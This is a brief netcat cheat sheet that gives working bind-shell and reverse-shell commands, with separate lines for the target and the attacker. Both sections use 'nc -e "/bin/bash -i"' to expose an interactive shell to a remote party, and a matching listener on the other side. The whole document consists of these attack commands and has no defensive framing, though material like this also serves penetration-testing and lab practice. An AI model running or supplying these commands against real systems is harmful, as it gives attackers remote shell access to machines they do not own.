# nc
## bind shell
  target
  ``` bash
  nc -l -p 1234 -e "/bin/bash -i"
  ```
  attacker
  ``` bash
  nc 127.0.0.1 1234 
  ```

## reverse shell
  target
  ``` bash
  nc 127.0.0.1 4321 -e "/bin/bash -i" 
  ```
  attacker
  ``` bash
  nc -l -p 4321
  ```

